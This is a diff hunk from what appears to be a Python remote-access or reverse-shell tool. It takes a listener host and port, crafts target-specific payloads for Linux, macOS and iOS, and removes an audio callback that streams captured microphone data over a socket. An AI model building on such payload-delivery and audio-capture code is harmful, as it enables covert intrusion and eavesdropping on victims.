@@ -29,10 +29,6 @@ if len(sys.argv) != 3:
 LHOST = sys.argv[1]
 LPORT = int(sys.argv[2])
 
-def callback(in_data, frame_count, time_info, status):
-    unicorn.send(in_data)
-    return (None, pyaudio.paContinue)
-
 def craft_payload(LHOST, LPORT, target_system):
     if target_system in ["Linux", "macOS", "iOS"]:
         print(G+"Sending "+target_system+" payload...")
